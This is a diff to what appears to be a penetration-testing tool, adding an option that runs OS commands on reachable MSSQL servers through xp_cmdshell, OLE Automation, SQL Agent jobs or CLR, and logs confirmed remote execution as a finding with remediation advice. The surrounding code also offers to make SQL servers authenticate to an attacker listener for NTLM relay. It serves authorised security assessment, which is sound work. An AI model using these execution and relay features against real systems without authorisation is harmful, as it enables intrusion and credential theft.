@@ -2686,6 +2686,28 @@ def cmd_mssql(args: argparse.Namespace) -> int:
                     print(f"      [+] {t['ip']}: linked-server walk reached {len(nodes)} "
                           f"instance(s), {sa_n} as sysadmin")
 
+            # Execute an OS command for effect (xp_cmdshell / OLE / Agent / CLR).
+            if args.exec_cmd:
+                out, eerr, ref = mssql.exec_command(
+                    t["ip"], creds, args.exec_cmd, method=args.method,
+                    port=t["port"], windows_auth=not args.local_auth)
+                if ref:
+                    print(f"      [i] {t['ip']} CLR is a tool hand-off: {ref}")
+                elif eerr:
+                    print(f"      [!] {t['ip']} exec ({args.method}): {eerr}")
+                else:
+                    snippet = " | ".join((out or "(no output)").splitlines()[:4])
+                    print(f"      [+] {t['ip']} RCE via {args.method}: {snippet}")
+                    analysis["findings"].insert(0, mssql._finding(
+                        "critical", f"Confirmed OS command execution via {args.method}",
+                        f"{t['ip']}:{t['port']}",
+                        f"Ran '{args.exec_cmd}' as the SQL service account. Output: "
+                        + (out or "")[:400], "impacket-mssqlclient",
+                        f"recce mssql -u <user> -p <pass> --exec '{args.exec_cmd}' "
+                        f"--method {args.method}",
+                        "Disable the primitive; run SQL under a low-privilege gMSA.",
+                        ["CWE-250", "CWE-269"]))
+
     # With any login we can coerce the service account's NetNTLM via UNC -> relay
     # it. Add the concrete relay finding (real targets) per endpoint.
     if creds:
@@ -3409,6 +3431,12 @@ def build_arg_parser() -> argparse.ArgumentParser:
     ms.add_argument("--relay", action="store_true",
                     help="actually trigger the SQL service account to authenticate to "
                          "--lhost (xp_dirtree) so your ntlmrelayx catches it")
+    ms.add_argument("--exec", dest="exec_cmd", metavar="CMD",
+                    help="execute an OS command on each reachable instance for effect "
+                         "and capture the output (needs sysadmin)")
+    ms.add_argument("--method", choices=["xp", "ole", "agent", "clr"], default="xp",
+                    help="execution primitive for --exec: xp_cmdshell (default), OLE "
+                         "Automation, SQL Agent job, or CLR (hands off to mssqlpwner)")
     ms.add_argument("--no-run", action="store_true",
                     help="don't execute nxc/impacket; just write the commands (airgapped-safe)")
     ms.add_argument("--no-probe", action="store_true",
